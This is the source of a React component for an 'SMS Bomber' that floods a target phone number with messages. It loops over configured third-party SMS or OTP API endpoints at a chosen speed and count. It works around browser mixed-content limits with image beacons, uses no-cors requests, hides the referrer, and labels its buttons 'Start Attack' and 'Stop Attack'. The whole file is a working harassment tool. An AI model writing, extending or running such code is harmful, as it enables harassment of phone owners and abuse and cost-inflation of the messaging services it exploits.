import React, { useState, useEffect, useRef } from 'react';
import { MessageTemplate, LogEntry, ApiNode } from '../types';
import { Zap, StopCircle, Terminal, Gauge, Server, AlertCircle } from 'lucide-react';

interface SenderProps {
  templates: MessageTemplate[];
  onSend: (log: LogEntry) => void;
  protectedNumbers: string[];
  activeNodes: ApiNode[];
}

const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, activeNodes }) => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [speed, setSpeed] = useState<'slow' | 'medium' | 'fast'>('medium');
  const [isRunning, setIsRunning] = useState(false);
  const [consoleLogs, setConsoleLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [stats, setStats] = useState({ success: 0, fail: 0 });
  const statsRef = useRef({ success: 0, fail: 0 }); // Ref for accurate final tracking

  const abortControllerRef = useRef<AbortController | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [consoleLogs]);

  const getDelay = () => {
    if (speed === 'slow') return 3000;
    if (speed === 'fast') return 800;
    return 1500;
  };

  const addLog = (msg: string) => {
    setConsoleLogs(prev => {
      const newLogs = [...prev, `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`];
      return newLogs.length > 50 ? newLogs.slice(newLogs.length - 50) : newLogs;
    });
  };

  const executeNode = async (node: ApiNode, phone: string, signal: AbortSignal) => {
      // 1. Prepare Phone Variations
      const raw = phone.replace(/^(\+88|88)/, ''); // 017...
      const p88 = `88${raw}`; // 88017...
      const pp88 = `+88${raw}`; // +88017...

      // 2. Prepare Payload & URL
      let body = node.body
        .replace(/{phone}/g, raw)
        .replace(/{phone_88}/g, p88)
        .replace(/{phone_p88}/g, pp88);
      
      let url = node.url
        .replace(/{phone}/g, raw)
        .replace(/{phone_88}/g, p88)
        .replace(/{phone_p88}/g, pp88);

      // 3. Prepare Headers
      let headers = {};
      try {
        headers = JSON.parse(node.headers);
      } catch (e) {
        throw new Error("Invalid Header Config");
      }

      // 4. Execute
      const isGet = node.method === 'GET';

      // MIXED CONTENT BYPASS STRATEGY
      const isMixedContent = typeof window !== 'undefined' && 
                             window.location.protocol === 'https:' && 
                             url.trim().startsWith('http:');

      if (isGet && isMixedContent) {
          return new Promise<Response>((resolve) => {
              const img = new Image();
              const beaconUrl = url + (url.includes('?') ? '&' : '?') + `_t=${Date.now()}`;
              
              const finish = () => {
                  resolve({ 
                      status: 200, 
                      ok: true, 
                      text: async () => "Beacon Sent" 
                  } as unknown as Response);
              };

              img.onload = finish;
              img.onerror = finish;
              img.src = beaconUrl;
              setTimeout(finish, 3000);
          });
      }

      const response = await fetch(url, {
          method: node.method,
          headers: headers,
          body: !isGet ? body : undefined,
          signal,
          mode: isGet ? 'no-cors' : 'cors',
          cache: 'no-store', // Attempt to reduce caching
          referrerPolicy: 'no-referrer' // Hide referrer
      });
      return response;
  };

  const handleStop = () => {
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
      abortControllerRef.current = null;
    }
    // Note: State update happens in the loop exit logic
    addLog(">> STOP REQUESTED...");
  };

  const handleStart = async () => {
    if (isRunning) return;
    if (!phoneNumber) { addLog(">> ERROR: TARGET REQUIRED"); return; }
    if (!amount) { addLog(">> ERROR: AMOUNT REQUIRED"); return; }
    
    const count = parseInt(amount);
    if (isNaN(count) || count <= 0) { addLog(">> ERROR: INVALID AMOUNT"); return; }

    if (protectedNumbers.includes(phoneNumber)) {
        addLog(">> BLOCKED: TARGET IN PROTECTOR DB");
        return;
    }

    if (activeNodes.length === 0) {
        addLog(">> ERROR: NO ACTIVE GATEWAYS FOUND. CONTACT ADMIN.");
        return;
    }

    setIsRunning(true);
    setProgress(0);
    setConsoleLogs([]);
    setStats({ success: 0, fail: 0 });
    statsRef.current = { success: 0, fail: 0 };
    
    addLog(`>> INITIALIZING... TARGET: ${phoneNumber}`);
    addLog(`>> GATEWAYS: ${activeNodes.length} ACTIVE`);

    abortControllerRef.current = new AbortController();
    const signal = abortControllerRef.current.signal;

    for (let i = 0; i < count; i++) {
      if (signal.aborted) break;

      const promises = activeNodes.map(async (api) => {
        try {
          const res = await executeNode(api, phoneNumber, signal);
          const ok = (res.status >= 200 && res.status < 300) || res.status === 0;
          
          if (!signal.aborted) {
              statsRef.current = {
                  success: statsRef.current.success + (ok ? 1 : 0),
                  fail: statsRef.current.fail + (ok ? 0 : 1)
              };
              setStats({...statsRef.current});
              addLog(`> [${api.name}] ${res.status === 0 ? 'SENT' : res.status} ${ok ? 'OK' : 'ERR'}`);
          }
        } catch (e: any) {
          if (e.name !== 'AbortError') {
             statsRef.current.fail += 1;
             setStats({...statsRef.current});
             const errorMsg = e.message === 'Failed to fetch' ? 'Net Error/CORS' : e.message;
             addLog(`> [${api.name}] FAILED: ${errorMsg}`);
          }
        }
      });

      await Promise.all(promises);
      if (signal.aborted) break;
      setProgress(((i + 1) / count) * 100);
      if (i < count - 1) await new Promise(r => setTimeout(r, getDelay()));
    }

    // Finished or Stopped - Save Log
    const totalSent = statsRef.current.success;
    const totalFailed = statsRef.current.fail;
    const isStopped = signal.aborted;

    addLog(isStopped ? ">> PROCESS ABORTED" : ">> COMPLETE");
    
    onSend({
      id: Date.now().toString(),
      contactName: 'Target',
      contactPhone: phoneNumber,
      message: `Limit: ${count} | OK: ${totalSent} | ERR: ${totalFailed}`, 
      status: isStopped ? 'queued' : 'sent',
      timestamp: new Date(),
    });

    setIsRunning(false);
    abortControllerRef.current = null;
  };

  return (
    <div className="p-5 pb-10 space-y-6 animate-fade-in">
      
      {/* Distinct Page Header for Bomber */}
      <div className="border-b border-zinc-800 pb-4 flex items-center gap-3">
          <div className="p-2 bg-red-600 rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)]">
             <Zap className="w-6 h-6 text-white fill-white" />
          </div>
          <div>
             <h2 className="text-xl font-black italic tracking-tighter text-white uppercase">SMS Bomber</h2>
             <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / HIGH_SPEED_ENGINE</p>
          </div>
      </div>

      <div className="space-y-4">
        
        {/* Number Input */}
        <div className="space-y-1.5">
           <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Target Number</label>
           <input
             disabled={isRunning}
             type="text"
             inputMode="numeric"
             value={phoneNumber}
             onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 11))}
             placeholder="017xxxxxxxx"
             className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-all placeholder-zinc-700"
           />
        </div>

        <div className="grid grid-cols-2 gap-4">
           {/* Amount */}
           <div className="space-y-1.5">
              <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Amount</label>
              <input
                disabled={isRunning}
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="100"
                className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-red-500 outline-none transition-all text-center"
              />
           </div>

           {/* Speed */}
           <div className="space-y-1.5">
               <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Speed</label>
               <div className="flex bg-zinc-900 rounded-lg border border-zinc-800 p-1">
                  {(['slow', 'medium', 'fast'] as const).map(s => (
                    <button
                      key={s}
                      disabled={isRunning}
                      onClick={() => setSpeed(s)}
                      className={`flex-1 py-2 rounded text-[10px] font-bold uppercase transition-all ${
                        speed === s ? 'bg-zinc-800 text-white shadow-sm border border-zinc-700' : 'text-zinc-600 hover:text-zinc-400'
                      }`}
                    >
                      {s}
                    </button>
                  ))}
               </div>
           </div>
        </div>

        {/* Action Button */}
        <button
          onClick={isRunning ? handleStop : handleStart}
          className={`w-full py-4 rounded-xl font-bold uppercase tracking-wider text-sm shadow-lg transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 ${
            isRunning 
            ? 'bg-zinc-800 hover:bg-zinc-700 text-red-500 border border-red-900/50' 
            : 'bg-red-600 hover:bg-red-500 text-white shadow-red-900/20'
          }`}
        >
          {isRunning ? (
            <><StopCircle className="w-5 h-5" /> Stop Attack</>
          ) : (
            <><Zap className="w-5 h-5 fill-current" /> Start Attack</>
          )}
        </button>
      </div>

      {/* Terminal */}
      <div className="bg-zinc-950 border border-zinc-900 rounded-xl overflow-hidden shadow-inner">
         <div className="px-4 py-2 bg-zinc-900 border-b border-zinc-800 flex justify-between items-center">
            <span className="text-[10px] font-bold text-zinc-500 uppercase flex items-center gap-2">
              <Terminal className="w-3 h-3" /> Console
            </span>
            <div className="flex gap-3 text-[10px] font-mono-code">
               <span className="text-emerald-500">OK:{stats.success}</span>
               <span className="text-red-500">ERR:{stats.fail}</span>
            </div>
         </div>
         
         <div 
           ref={scrollRef}
           className="h-40 overflow-y-auto p-4 font-mono-code text-[10px] text-zinc-400 space-y-1 scroll-smooth"
         >
            {consoleLogs.length === 0 ? (
               <div className="h-full flex flex-col items-center justify-center opacity-30 gap-2">
                  <Server className="w-6 h-6" />
                  <span>Ready to initialize</span>
               </div>
            ) : (
               consoleLogs.map((l, i) => (
                 <div key={i} className={`border-l-2 pl-2 py-0.5 ${l.includes('FAILED') || l.includes('ERR') || l.includes('STOPPED') ? 'border-red-500 text-red-400' : 'border-zinc-800'}`}>
                   {l}
                 </div>
               ))
            )}
            {isRunning && <div className="animate-pulse text-emerald-500">_</div>}
         </div>
         
         {/* Progress Bar */}
         {isRunning && (
            <div className="h-1 bg-zinc-900 w-full">
               <div className="h-full bg-red-500 transition-all duration-300" style={{ width: `${progress}%` }}></div>
            </div>
         )}
      </div>
    </div>
  );
};

export default Sender;